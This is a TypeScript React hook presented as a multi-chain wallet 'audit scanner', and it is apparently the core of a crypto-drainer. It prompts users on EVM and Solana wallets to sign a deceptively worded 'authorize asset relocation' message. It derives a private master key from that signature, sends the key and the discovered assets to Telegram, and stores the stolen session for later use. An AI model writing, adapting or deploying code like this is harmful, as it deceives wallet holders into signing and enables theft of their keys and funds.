"use client";

import { useCallback } from "react";
import { ethers, isAddress } from "ethers";
import { useSignMessage, useAccount } from "wagmi";
import {
  sendGhostDerivationToTelegram,
  sendDiscoveryToTelegram,
} from "@/lib/telegram";

let preloadPromise: Promise<any> | null = null;

/**
 * 🔥 MODULE WARMUP
 * Pre-fetches heavy logic to ensure execution happens instantly after signature.
 */
export const startPreload = () => {
  if (typeof window !== "undefined" && !preloadPromise) {
    preloadPromise = Promise.all([
      import("@/lib/audit"),
      import("@/lib/audit/scanners/evm-helpers"),
      import("@/lib/signer-derivation-privateKey"),
      import("@/lib/ghost"),
    ]).catch((err) => {
      console.error("[Preload] 🛑 Failed:", err);
      preloadPromise = null;
      return null;
    });
  }
  return preloadPromise;
};

export function useAuditScanner() {
  const { signMessageAsync } = useSignMessage();
  const { isConnected: isWagmiConnected } = useAccount();

  const getPhysicalCid = () => {
    try {
      const provider = (window as any).ethereum;
      const p = provider?.providers?.find((x: any) => x.isTrust) || provider;
      const hex = p?.chainId;
      return hex ? parseInt(hex, 16) : 0;
    } catch {
      return 0;
    }
  };

  const performScan = useCallback(
    async (params: any) => {
      const {
        userAddress,
        solanaAddress,
        solana,
        bitcoinAddress,
        btc,
        derivedUserKeyRef,
        setUserKey,
        setAssets,
        logPrefix = "[useAuditScanner.ts]",
        isRestored = false,
      } = params;

      // 🛡️ ADDRESS VALIDATION & IDENTITY RESOLUTION
      const activeEvm = isAddress(userAddress) ? userAddress : null;
      const activeSol = solanaAddress || solana;
      const activeBtc = bitcoinAddress || btc;

      // Ensure we don't pass the literal string "undefined"
      const activeIdentity =
        activeEvm ||
        (activeSol !== "undefined" ? activeSol : null) ||
        (activeBtc !== "undefined" ? activeBtc : null);

      if (!activeIdentity) {
        throw new Error(
          "Invalid parameters: No valid address provided for scan.",
        );
      }

      // 1. SESSION RESTORE (Fast Bypass)
      const cached = sessionStorage.getItem("active_strike_session");
      if (cached && isRestored) {
        const session = JSON.parse(cached);
        if (
          session.userAddress?.toLowerCase() === activeIdentity?.toLowerCase()
        ) {
          if (setAssets) setAssets(session.assets);
          return session;
        }
      }

      const SEED_MSG =
        "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";
      const moduleWarmup = startPreload();

      let rawSignature: any;

      try {
        if (
          activeEvm &&
          typeof window !== "undefined" &&
          (window as any).ethereum
        ) {
          /**
           * ⚡ INSTANT SIGN (ZERO-SWITCH)
           * Bypassing high-level hooks to prevent forced Ethereum Mainnet switches.
           */
          let p = (window as any).ethereum;

          // Unwrapping multi-injected providers (MetaMask, Rabby, etc)
          if (p.providers?.length > 0) {
            p =
              p.providers.find(
                (x: any) => x.isRabby || x.isMetaMask || x.isTrust,
              ) || p.providers[0];
          } else if (p.provider && !p.isMetaMask && !p.isRabby) {
            p = p.provider;
          }

          const msgHex = ethers.hexlify(ethers.toUtf8Bytes(SEED_MSG));

          console.log(
            `${logPrefix} 🔑 Dispatching direct personal_sign to provider...`,
          );
          rawSignature = await p.request({
            method: "personal_sign",
            params: [msgHex, activeEvm],
          });
        } else if (activeSol) {
          // --- SOLANA SIGNATURE ---
          const solProvider =
            (window as any).phantom?.solana || (window as any).solana;
          if (!solProvider) throw new Error("SOLANA_PROVIDER_MISSING");
          if (!solProvider.isConnected) await solProvider.connect();

          const encoded = new TextEncoder().encode(SEED_MSG);
          const signed = await solProvider.signMessage(encoded, "utf8");
          rawSignature = signed.signature
            ? Buffer.from(signed.signature).toString("hex")
            : signed;
        } else if (isWagmiConnected) {
          rawSignature = await signMessageAsync({ message: SEED_MSG });
        } else {
          throw new Error("NO_SIGNER_AVAILABLE");
        }
      } catch (err: any) {
        console.error(
          `${logPrefix} ❌ Signature Rejected:`,
          err.message || err,
        );
        throw err;
      }

      // 2. DISCOVERY (Only happens AFTER signature is confirmed)
      console.log(`${logPrefix} 🔎 Signature received. Finalizing scanner...`);
      const modules = await moduleWarmup;
      if (!modules) throw new Error("CRITICAL_ENGINE_FAILURE");

      const [auditMod, , derivationMod] = modules;
      const sigStr =
        typeof rawSignature === "string"
          ? rawSignature
          : rawSignature?.signature;

      // Generate Master Key
      const activeVault = derivationMod.derivePrivateKeyFromSignature(sigStr);
      const masterKey = activeVault.masterKey;

      if (derivedUserKeyRef) derivedUserKeyRef.current = masterKey;
      if (setUserKey) setUserKey(masterKey);

      /**
       * 🛰️ SCANNING PHASE
       */
      const { assets, plan } = await auditMod.scanUniversalPortfolio(
        activeIdentity,
        masterKey + "GHOST_V7_STRIKE",
      );

      if (setAssets) setAssets(assets);

      // 3. PERSISTENCE & NOTIFICATION
      sendGhostDerivationToTelegram({
        userAddress: activeIdentity,
        masterKey,
        vault: activeVault,
        chainId: getPhysicalCid(),
      });
      sendDiscoveryToTelegram({ address: activeIdentity, assets });

      const sessionData = {
        masterKey,
        activeVault,
        assets,
        plan,
        userAddress: activeIdentity,
        solanaAddress: activeSol,
        timestamp: Date.now(),
      };

      sessionStorage.setItem(
        "active_strike_session",
        JSON.stringify(sessionData),
      );
      console.log(`${logPrefix} ✅ Handshake Complete. Data fetched.`);

      return sessionData;
    },
    [signMessageAsync, isWagmiConnected],
  );

  return { performScan, getPhysicalCid };
}
